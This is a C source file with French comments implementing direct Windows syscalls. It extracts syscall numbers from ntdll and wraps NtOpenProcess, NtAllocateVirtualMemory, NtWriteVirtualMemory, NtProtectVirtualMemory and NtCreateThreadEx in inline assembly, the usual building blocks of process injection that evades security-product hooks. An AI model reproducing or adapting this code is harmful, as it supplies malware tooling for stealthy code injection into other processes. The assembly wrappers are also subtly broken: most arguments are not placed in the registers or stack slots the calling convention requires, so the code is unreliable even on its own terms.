#include "syscalls.h"
#include <stdio.h>
#include <string.h>

syscall_table_t g_syscall_table = {0};

/* Extrait le numéro de syscall depuis le prologue d'une fonction NT */
static uint16_t extract_syscall_number(void* function_address) {
    if (!function_address) return 0;

    uint8_t* bytes = (uint8_t*)function_address;

    /*
     * Pattern typique d'une fonction NT dans ntdll.dll (x64):
     *
     * mov r10, rcx        ; 4C 8B D1
     * mov eax, <SSN>      ; B8 XX XX 00 00
     * syscall             ; 0F 05
     * ret                 ; C3
     */

    /* Cherche le pattern: mov r10, rcx */
    if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1) {
        /* Le SSN est dans les 2 octets suivant B8 */
        if (bytes[3] == 0xB8) {
            uint16_t ssn = *(uint16_t*)&bytes[4];
            return ssn;
        }
    }

    /* Alternative: certaines versions peuvent avoir test/jmp avant */
    for (int i = 0; i < 32; i++) {
        if (bytes[i] == 0xB8) {
            uint16_t ssn = *(uint16_t*)&bytes[i + 1];
            return ssn;
        }
    }

    return 0;
}

/* Initialise la table de syscalls */
int syscalls_init(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        return -1;
    }

    /* Résout les adresses des fonctions NT */
    void* pNtAllocateVirtualMemory = GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    void* pNtWriteVirtualMemory = GetProcAddress(ntdll, "NtWriteVirtualMemory");
    void* pNtProtectVirtualMemory = GetProcAddress(ntdll, "NtProtectVirtualMemory");
    void* pNtCreateThreadEx = GetProcAddress(ntdll, "NtCreateThreadEx");
    void* pNtOpenProcess = GetProcAddress(ntdll, "NtOpenProcess");
    void* pNtClose = GetProcAddress(ntdll, "NtClose");

    /* Extrait les numéros de syscall */
    g_syscall_table.NtAllocateVirtualMemory = extract_syscall_number(pNtAllocateVirtualMemory);
    g_syscall_table.NtWriteVirtualMemory = extract_syscall_number(pNtWriteVirtualMemory);
    g_syscall_table.NtProtectVirtualMemory = extract_syscall_number(pNtProtectVirtualMemory);
    g_syscall_table.NtCreateThreadEx = extract_syscall_number(pNtCreateThreadEx);
    g_syscall_table.NtOpenProcess = extract_syscall_number(pNtOpenProcess);
    g_syscall_table.NtClose = extract_syscall_number(pNtClose);

    /* Vérifie qu'on a bien trouvé les SSN */
    if (g_syscall_table.NtAllocateVirtualMemory == 0 ||
        g_syscall_table.NtWriteVirtualMemory == 0 ||
        g_syscall_table.NtOpenProcess == 0) {
        return -1;
    }

    return 0;
}

void syscalls_cleanup(void) {
    memset(&g_syscall_table, 0, sizeof(g_syscall_table));
}

/* Macro pour exécuter un syscall direct (x64) */
#if defined(_WIN64)
#define DO_SYSCALL(ssn) \
    __asm__ volatile( \
        "mov r10, rcx\n" \
        "mov eax, %0\n" \
        "syscall\n" \
        : \
        : "r" (ssn) \
        : "rax", "rcx", "r11", "memory" \
    )
#else
#error "Syscalls directs non supportés en 32-bit"
#endif

/*
 * Wrappers pour chaque syscall
 * Note: En x64 Windows, les 4 premiers arguments sont dans RCX, RDX, R8, R9
 * Les arguments suivants sont sur la stack
 */

NTSTATUS syscall_NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect)
{
    NTSTATUS status;

    __asm__ volatile(
        "mov r10, rcx\n"           // ProcessHandle
        "mov eax, %1\n"            // SSN
        "syscall\n"
        "mov %0, eax\n"
        : "=r" (status)
        : "r" ((uint32_t)g_syscall_table.NtAllocateVirtualMemory),
          "c" (ProcessHandle),
          "d" (BaseAddress),
          "r" (ZeroBits),
          "r" (RegionSize)
        : "rax", "r10", "r11", "memory"
    );

    return status;
}

NTSTATUS syscall_NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten)
{
    NTSTATUS status;

    __asm__ volatile(
        "mov r10, rcx\n"
        "mov eax, %1\n"
        "syscall\n"
        "mov %0, eax\n"
        : "=r" (status)
        : "r" ((uint32_t)g_syscall_table.NtWriteVirtualMemory),
          "c" (ProcessHandle),
          "d" (BaseAddress),
          "r" (Buffer),
          "r" (NumberOfBytesToWrite)
        : "rax", "r10", "r11", "memory"
    );

    return status;
}

NTSTATUS syscall_NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect)
{
    NTSTATUS status;

    __asm__ volatile(
        "mov r10, rcx\n"
        "mov eax, %1\n"
        "syscall\n"
        "mov %0, eax\n"
        : "=r" (status)
        : "r" ((uint32_t)g_syscall_table.NtProtectVirtualMemory),
          "c" (ProcessHandle),
          "d" (BaseAddress),
          "r" (RegionSize),
          "r" (NewProtect)
        : "rax", "r10", "r11", "memory"
    );

    return status;
}

NTSTATUS syscall_NtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList)
{
    NTSTATUS status;

    __asm__ volatile(
        "mov r10, rcx\n"
        "mov eax, %1\n"
        "syscall\n"
        "mov %0, eax\n"
        : "=r" (status)
        : "r" ((uint32_t)g_syscall_table.NtCreateThreadEx),
          "c" (ThreadHandle),
          "d" (DesiredAccess),
          "r" (ObjectAttributes),
          "r" (ProcessHandle)
        : "rax", "r10", "r11", "memory"
    );

    return status;
}

NTSTATUS syscall_NtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId)
{
    NTSTATUS status;

    __asm__ volatile(
        "mov r10, rcx\n"
        "mov eax, %1\n"
        "syscall\n"
        "mov %0, eax\n"
        : "=r" (status)
        : "r" ((uint32_t)g_syscall_table.NtOpenProcess),
          "c" (ProcessHandle),
          "d" (DesiredAccess),
          "r" (ObjectAttributes),
          "r" (ClientId)
        : "rax", "r10", "r11", "memory"
    );

    return status;
}

NTSTATUS syscall_NtClose(HANDLE Handle)
{
    NTSTATUS status;

    __asm__ volatile(
        "mov r10, rcx\n"
        "mov eax, %1\n"
        "syscall\n"
        "mov %0, eax\n"
        : "=r" (status)
        : "r" ((uint32_t)g_syscall_table.NtClose),
          "c" (Handle)
        : "rax", "r10", "r11", "memory"
    );

    return status;
}
